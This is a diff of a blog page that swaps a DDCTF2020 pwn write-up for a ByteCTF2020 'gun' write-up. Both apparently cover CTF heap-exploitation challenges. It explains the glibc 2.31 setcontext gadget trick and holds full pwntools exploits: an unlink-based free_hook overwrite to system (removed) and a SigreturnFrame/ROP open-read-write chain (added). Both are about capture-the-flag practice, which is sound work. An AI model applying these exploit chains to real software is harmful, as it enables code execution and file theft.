@@ -43,7 +43,7 @@
     
     <title>
         
-            DDCTF2020 pwn | 
+            ByteCTF2020 gun | 
         
         Apr1L&#39;s blog
     </title>
@@ -54,7 +54,7 @@
 
     <meta name="format-detection" content="telephone=no">
     <meta name="description" itemprop="description" content>
-    <meta name="keywords" content=",pwn">
+    <meta name="keywords" content=",pwn,heap">
     <meta name="theme-color" content="#0097A7">
 
     <!-- Disable Fucking Bloody Baidu Tranformation -->
@@ -220,7 +220,7 @@
     <!-- WebAPP Icons -->
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="application-name" content="Apr1L&#39;s blog">
-    <meta name="msapplication-starturl" content="http://suvii22.github.io/2020/09/21/DDCTF2020-pwn/">
+    <meta name="msapplication-starturl" content="http://suvii22.github.io/2020/11/01/ByteCTF2020-gun/">
     <meta name="msapplication-navbutton-color" content="#0097A7">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-title" content="Apr1L&#39;s blog">
@@ -235,16 +235,16 @@
     
 
     <!-- The Open Graph protocol -->
-    <meta property="og:url" content="http://suvii22.github.io/2020/09/21/DDCTF2020-pwn/">
+    <meta property="og:url" content="http://suvii22.github.io/2020/11/01/ByteCTF2020-gun/">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="DDCTF2020 pwn | Apr1L&#39;s blog">
+    <meta property="og:title" content="ByteCTF2020 gun | Apr1L&#39;s blog">
     <meta property="og:image" content="/img/favicon.png">
     <meta property="og:description" content>
-    <meta property="og:article:tag" content="pwn"> 
+    <meta property="og:article:tag" content="pwn"> <meta property="og:article:tag" content="heap"> 
 
     
-        <meta property="article:published_time" content="Mon Sep 21 2020 13:44:20 GMT+0800">
-        <meta property="article:modified_time" content="Mon Oct 26 2020 12:19:21 GMT+0800">
+        <meta property="article:published_time" content="Sun Nov 01 2020 20:39:43 GMT+0800">
+        <meta property="article:modified_time" content="Sun Nov 01 2020 21:26:18 GMT+0800">
     
 
     <!-- The Twitter Card protocol -->
@@ -252,7 +252,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://suvii22.github.io/2020/09/21/DDCTF2020-pwn/index.html">
+        <link rel="canonical" href="http://suvii22.github.io/2020/11/01/ByteCTF2020-gun/index.html">
     
 
     <!-- Structured-data for SEO -->
@@ -264,10 +264,10 @@
 {
     "@context": "https://schema.org",
     "@type": "BlogPosting",
-    "mainEntityOfPage": "http://suvii22.github.io/2020/09/21/DDCTF2020-pwn/index.html",
-    "headline": "DDCTF2020 pwn",
-    "datePublished": "Mon Sep 21 2020 13:44:20 GMT+0800",
-    "dateModified": "Mon Oct 26 2020 12:19:21 GMT+0800",
+    "mainEntityOfPage": "http://suvii22.github.io/2020/11/01/ByteCTF2020-gun/index.html",
+    "headline": "ByteCTF2020 gun",
+    "datePublished": "Sun Nov 01 2020 20:39:43 GMT+0800",
+    "dateModified": "Sun Nov 01 2020 21:26:18 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "Apr1L",
@@ -285,7 +285,7 @@
             "url": "/img/favicon.png"
         }
     },
-    "keywords": ",pwn",
+    "keywords": ",pwn,heap",
     "description": "",
 }
 </script>
@@ -345,6 +345,15 @@
     <!-- Left aligned menu below button -->
     
     
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#setcontext"><span class="post-toc-number">1.</span> <span class="post-toc-text">setcontext()</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#EXP"><span class="post-toc-number">2.</span> <span class="post-toc-text">EXP</span></a></li></ol>
+    </ul>
+    
 
 
 
@@ -374,7 +383,7 @@
         
     
             <p class="article-headline-p">
-                DDCTF2020 pwn
+                ByteCTF2020 gun
             </p>
         </div>
 
@@ -393,7 +402,7 @@
     <!-- Author Name & Date -->
     <div>
         <strong>Apr1L</strong>
-        <span>Sep 21, 2020</span>
+        <span>Nov 01, 2020</span>
     </div>
 
     <div class="section-spacer"></div>
@@ -417,7 +426,7 @@
     </button>
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/pwn/">pwn</a>
+        <a class="post_tag-link" href="/tags/heap/">heap</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/pwn/">pwn</a>
     </ul>
     
 
@@ -434,7 +443,7 @@
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=DDCTF2020 pwn&url=http://suvii22.github.io/2020/09/21/DDCTF2020-pwn/index.html&pic=http://suvii22.github.io/img/favicon.png&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=ByteCTF2020 gun&url=http://suvii22.github.io/2020/11/01/ByteCTF2020-gun/index.html&pic=http://suvii22.github.io/img/favicon.png&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 Share to Weibo
             </li>
@@ -443,7 +452,7 @@
 
     <!-- Share Twitter -->
     
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=DDCTF2020 pwn&url=http://suvii22.github.io/2020/09/21/DDCTF2020-pwn/index.html&via=Apr1L" target="_blank">
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=ByteCTF2020 gun&url=http://suvii22.github.io/2020/11/01/ByteCTF2020-gun/index.html&via=Apr1L" target="_blank">
             <li class="mdl-menu__item">
                 Share to Twitter
             </li>
@@ -452,7 +461,7 @@
 
     <!-- Share Facebook -->
     
-        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://suvii22.github.io/2020/09/21/DDCTF2020-pwn/index.html" target="_blank">
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://suvii22.github.io/2020/11/01/ByteCTF2020-gun/index.html" target="_blank">
             <li class="mdl-menu__item">
                 Share to Facebook
             </li>
@@ -461,7 +470,7 @@
 
     <!-- Share Google+ -->
     
-        <a class="post_share-link" href="https://plus.google.com/share?url=http://suvii22.github.io/2020/09/21/DDCTF2020-pwn/index.html" target="_blank">
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://suvii22.github.io/2020/11/01/ByteCTF2020-gun/index.html" target="_blank">
             <li class="mdl-menu__item">
                 Share to Google+
             </li>
@@ -486,77 +495,181 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <p>这个程序的洞在 show 的时候会 push 一个 0xaabbccdd，当申请新的 chunk 时并没有更新 start 指针，这样就有可能造成 edit 向下溢出。</p>
-<p>利用方法全程参考这篇<a href="http://yulige.top/?p=780" target="_blank" rel="noopener">writeup</a>。将一个0x90的chunk通过show释放进入unsortedbin，因为未更新start指针，可以leak出libc；因为程序没开pie，可以通过show来实现unlink（向后合并堆块，太菜了学到了），修改bss地址来造成任意地址写，之后覆写free_hook为system来get shell。</p>
-<p>exp:</p>
-<pre><code class="python">from pwn import *
-
-context.log_level = &#39;debug&#39;
-
-p = process(&#39;./pwn1&#39;)
+        <p>ByteCTF2020也太难了，gun由于不会setcontext只做了一半，剩下一半被1s秒杀（1s，yyds）。记录一下学到的新姿势。</p>
+<h2 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext()"></a>setcontext()</h2><p>glibc2.31</p>
+<pre><code>   0x7ffff7e1c0a0 &lt;setcontext&gt;:    endbr64 
+   0x7ffff7e1c0a4 &lt;setcontext+4&gt;:    push   rdi
+   0x7ffff7e1c0a5 &lt;setcontext+5&gt;:    lea    rsi,[rdi+0x128]
+   0x7ffff7e1c0ac &lt;setcontext+12&gt;:    xor    edx,edx
+   0x7ffff7e1c0ae &lt;setcontext+14&gt;:    mov    edi,0x2
+   0x7ffff7e1c0b3 &lt;setcontext+19&gt;:    mov    r10d,0x8
+   0x7ffff7e1c0b9 &lt;setcontext+25&gt;:    mov    eax,0xe
+   0x7ffff7e1c0be &lt;setcontext+30&gt;:    syscall 
+   0x7ffff7e1c0c0 &lt;setcontext+32&gt;:    pop    rdx
+   0x7ffff7e1c0c1 &lt;setcontext+33&gt;:    cmp    rax,0xfffffffffffff001
+   0x7ffff7e1c0c7 &lt;setcontext+39&gt;:    jae    0x7ffff7e1c1ef &lt;setcontext+335&gt;
+   0x7ffff7e1c0cd &lt;setcontext+45&gt;:    mov    rcx,QWORD PTR [rdx+0xe0]
+   0x7ffff7e1c0d4 &lt;setcontext+52&gt;:    fldenv [rcx]
+   0x7ffff7e1c0d6 &lt;setcontext+54&gt;:    ldmxcsr DWORD PTR [rdx+0x1c0]
+   0x7ffff7e1c0dd &lt;setcontext+61&gt;:    mov    rsp,QWORD PTR [rdx+0xa0]
+   0x7ffff7e1c0e4 &lt;setcontext+68&gt;:    mov    rbx,QWORD PTR [rdx+0x80]
+   0x7ffff7e1c0eb &lt;setcontext+75&gt;:    mov    rbp,QWORD PTR [rdx+0x78]
+   0x7ffff7e1c0ef &lt;setcontext+79&gt;:    mov    r12,QWORD PTR [rdx+0x48]
+   0x7ffff7e1c0f3 &lt;setcontext+83&gt;:    mov    r13,QWORD PTR [rdx+0x50]
+   0x7ffff7e1c0f7 &lt;setcontext+87&gt;:    mov    r14,QWORD PTR [rdx+0x58]
+   0x7ffff7e1c0fb &lt;setcontext+91&gt;:    mov    r15,QWORD PTR [rdx+0x60]
+   0x7ffff7e1c0ff &lt;setcontext+95&gt;:    test   DWORD PTR fs:0x48,0x2
+   0x7ffff7e1c10b &lt;setcontext+107&gt;:    je     0x7ffff7e1c1c6 &lt;setcontext+294&gt;
+   ······
+   0x7ffff7e1c1c6 &lt;setcontext+294&gt;:    mov    rcx,QWORD PTR [rdx+0xa8]
+   0x7ffff7e1c1cd &lt;setcontext+301&gt;:    push   rcx
+   0x7ffff7e1c1ce &lt;setcontext+302&gt;:    mov    rsi,QWORD PTR [rdx+0x70]
+   0x7ffff7e1c1d2 &lt;setcontext+306&gt;:    mov    rdi,QWORD PTR [rdx+0x68]
+   0x7ffff7e1c1d6 &lt;setcontext+310&gt;:    mov    rcx,QWORD PTR [rdx+0x98]
+   0x7ffff7e1c1dd &lt;setcontext+317&gt;:    mov    r8,QWORD PTR [rdx+0x28]
+   0x7ffff7e1c1e1 &lt;setcontext+321&gt;:    mov    r9,QWORD PTR [rdx+0x30]
+   0x7ffff7e1c1e5 &lt;setcontext+325&gt;:    mov    rdx,QWORD PTR [rdx+0x88]
+   0x7ffff7e1c1ec &lt;setcontext+332&gt;:    xor    eax,eax
+   0x7ffff7e1c1ee &lt;setcontext+334&gt;:    ret</code></pre><p>需要跳到&lt;setcontext+61&gt;来扩大控制范围，所以如何控制rdx的值就很关键。可以找到一个很有用的gadget：</p>
+<pre><code>mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]</code></pre><p>我们可以覆盖free_hook为该gadget的地址，free(chunk)的时候布置好chunk内容通过<code>mov rdx, qword ptr [rdi + 8]</code>来控制rdx；<code>call qword ptr [rdx + 0x20]</code>再跳到&lt;setcontext+61&gt;来orw。</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
+context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)
+p = process(&#39;./gun&#39;)
+#p=remote(&#39;123.57.209.176&#39;,30772)
+elf = ELF(&#39;./gun&#39;)
 libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
 
-def add(num):
-    p.sendlineafter(&#39;&gt;&gt;&#39;,str(1))
-    p.sendlineafter(&#39;num:&#39;,str(num))
+#context.log_level = &#39;debug&#39;
 
-def clear():
-    p.sendlineafter(&#39;&gt;&gt;&#39;,str(3))
+def shoot(idx):
+    p.sendlineafter(&#39;Action&gt; &#39;,str(1))
+    p.sendlineafter(&#39;Shoot time: &#39;,str(idx))
 
-def show():
-    p.sendlineafter(&#39;&gt;&gt;&#39;,str(2))
+def load(idx):
+    p.sendlineafter(&#39;Action&gt; &#39;,str(2))
+    p.sendlineafter(&#39;load?&#39;,str(idx))
 
-def edit(con):
-    p.sendlineafter(&#39;(y/n):&#39;,&#39;y&#39;)
-    p.sendline(str(con))
+def buy(pri,con):
+    p.sendlineafter(&#39;Action&gt; &#39;,str(3))
+    p.sendlineafter(&#39;price: &#39;,str(pri))
+    global money
+    money = 0x1000
+    money = money - pri
+    p.info(&quot;last money: &quot;+hex(money))
+    #money - price &gt;&gt; 0x3f == 0
+    #price &gt; 0x10 &amp;&amp; price &lt; 0x501
+    p.sendlineafter(&#39;Name: &#39;,con)
+
+p.recvuntil(&#39;Your name: &#39;)
+p.sendline(b&#39;a&#39;*0x18)
 
 
-for i in range(16):
-    add(i)
-show()
-p.recvuntil(&#39;1:&#39;)
-libc_base = int(p.recvline())-0x3c4b78
-p.info(&#39;libc_base: &#39;+hex(libc_base))
-
-system = libc_base + libc.sym[&#39;system&#39;]
-bin_sh = libc_base + next(libc.search(&#39;/bin/sh\x00&#39;))
-free_hook = libc_base + libc.sym[&#39;__free_hook&#39;]
-
-for i in range(34):
-    p.sendlineafter(&#39;(y/n):&#39;,&#39;n&#39;)
-clear()
-
-for i in range(8):
-    add(0x20)
-show()
-
-for i in range(8):
-    p.sendlineafter(&#39;Edit (y/n):&#39;,&#39;n&#39;)
-edit(&#39;-16&#39;)
-edit(0x90)
-edit(0)
-edit(0x21)
-edit(0x605398 - 0x18)
-edit(0x605398 - 0x10)
-for i in range(4):
-    p.sendlineafter(&#39;Edit (y/n):&#39;,&#39;n&#39;)
-
-#gdb.attach(p)
-#pause()
 for i in range(7):
-    add(i)
-show()
-edit(free_hook - 8)
-edit(free_hook + 8)
-edit(0)
-edit(0x605398)
-edit(0x6053A8)
-show()
-edit(0x68732F6E69622F)
-edit(system)
-clear()
+    buy(0x20,b&#39;a&#39;*0x8)    #0-6
+for i in range(7):
+    load(6-i)
+shoot(7)
+
+for i in range(7):
+    buy(0x80,&#39;a&#39;*0x80)   #0-6
+buy(0x80,&#39;b&#39;*0x80)       #7 -&gt; prev
+buy(0x80,&#39;a&#39;*0x80)       #8 -&gt; victim
+buy(0x30,&#39;a&#39;*0x30)       #9
+for i in range(9):
+    load(8-i)
+shoot(9)
+
+buy(0x80,&#39;\xf0&#39;)
+
+for i in range(7):
+    buy(0x20,&#39;a&#39;*0x8)   #1-7
+for i in range(7):
+    load(7-i)
+shoot(7)
+shoot(1)
+buy(0xa0,&#39;a&#39;*0x8)          #1
+buy(0x30,&#39;a&#39;*0x8)          #2
+buy(0x30,&#39;b&#39;*0x8)          #3
+load(2)
+load(3)
+shoot(2)
+p.recvuntil(&#39;aaaaaaaa&#39;)
+libc_base = u64(p.recv(6)+&#39;\x00\x00&#39;)-0x1ebbe0
+p.info(&#39;libc_base: &#39;+hex(libc_base))
+free_hook = libc_base + libc.sym[&#39;__free_hook&#39;]
+setcontext = libc_base + libc.symbols[&#39;setcontext&#39;]
+
+buy(0x30,&#39;\x70&#39;)   #2
+load(2)
+shoot(1)
+p.recv(9)
+heap_addr = u64(p.recv(6)+&#39;\x00\x00&#39;)-0x970
+p.info(&#39;heap_addr: &#39;+hex(heap_addr))
+
+load(1)
+shoot(1)
+buy(0xa0,&#39;a&#39;*0x80+p64(0x90)*2+p64(free_hook)) #1
+
+
+######
+syscall_ret=libc.search(asm(&quot;syscall\nret&quot;)).next()+libc_base
+gadget=p64(0x0000000000154930 + libc_base) 
+#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]
+
+buy(0x80, &quot;./flag\x00\x00&quot;)#2
+
+heap_orw = heap_addr + 0xe20
+frame_addr = heap_addr +0x9b0
+flag=heap_addr+0x8a0
+
 
 #gdb.attach(p)
+#p.interactive()
+
+pop_rdi_ret = libc_base + 0x0000000000026B72
+pop_rdx_r12 = libc_base + 0x000000000011c371
+pop_rsi_ret = libc_base + 0x0000000000027529
+pop_rax_ret = libc_base + 0x000000000004A550
+ret=libc_base+0x0000000000025679
+
+Open = libc_base + libc.sym[&#39;open&#39;]
+Read = libc_base + libc.sym[&#39;read&#39;]
+Puts = libc_base + libc.sym[&#39;puts&#39;]
+Write = libc_base + libc.sym[&#39;write&#39;]
+
+
+setcontext = libc_base + libc.sym[&#39;setcontext&#39;] + 61
+
+frame = SigreturnFrame()
+frame.rax = 0
+frame.rdi = 0
+frame.rsi = heap_orw
+frame.rdx = 0x1000
+frame.rsp = heap_orw
+frame.rip = syscall_ret
+str_frame = str(frame)
+
+
+buy(0x400, p64(0)*4+p64(setcontext)+str_frame[0x28:])#3
+
+buy(0x50, p64(0) + p64(frame_addr))#4
+
+#0x555555559dc0
+
+buy(0x100,&#39;\x00&#39;)#5
+buy(0x80, gadget)#6
+
+p2 = p64(pop_rdi_ret) + p64(flag) + p64(pop_rsi_ret) + p64(0)
+p2 += p64(Open)
+p2 += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(heap_addr+0xde0) + p64(pop_rdx_r12) + p64(0x200) + p64(0)
+p2 += p64(Read)
+p2 += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(heap_addr+0xde0) + p64(pop_rdx_r12) + p64(0x200) + p64(0)
+p2 += p64(Write)
+
+load(4)
+shoot(1)
+p.sendline(p2)
+
 p.interactive()</code></pre>
 
         
@@ -578,21 +691,13 @@ p.interactive()</code></pre>
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2020/10/23/N1CTF2020-SignIn/" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            Newer
-        </a>
-    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
     
-        <a href="/2020/09/01/dycb-veryeasy/" id="post_nav-older" class="next-content">
+        <a href="/2020/10/23/N1CTF2020-SignIn/" id="post_nav-older" class="next-content">
             Older
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
